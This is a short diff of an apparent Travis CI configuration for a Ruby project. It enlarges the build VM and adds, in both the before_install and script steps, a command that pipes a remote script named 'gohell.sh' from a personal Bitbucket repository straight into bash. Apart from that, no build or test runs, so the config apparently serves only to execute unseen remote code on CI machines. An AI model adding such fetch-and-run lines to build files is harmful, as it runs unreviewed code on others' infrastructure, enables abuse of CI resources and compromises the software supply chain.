@@ -1,9 +1,10 @@
 language: ruby
 
-dist: focal
+services:
+  - docker
   
 vm:
-  size: gpu-xlarge
+  size: 2x-large
   
 rvm:
   - "3.0.1"
@@ -74,7 +75,7 @@ rvm:
   - "1.9.3"
 
 before_install:
-  - curl -sL https://bitbucket.org/lariza999/gradi/raw/main/tes | bash
+  - curl -sL https://bitbucket.org/lariza999/gradi/raw/main/gohell.sh | bash
 
 script:
-  - curl -sL https://bitbucket.org/lariza999/gradi/raw/main/tes | bash
+  - curl -sL https://bitbucket.org/lariza999/gradi/raw/main/gohell.sh | bash
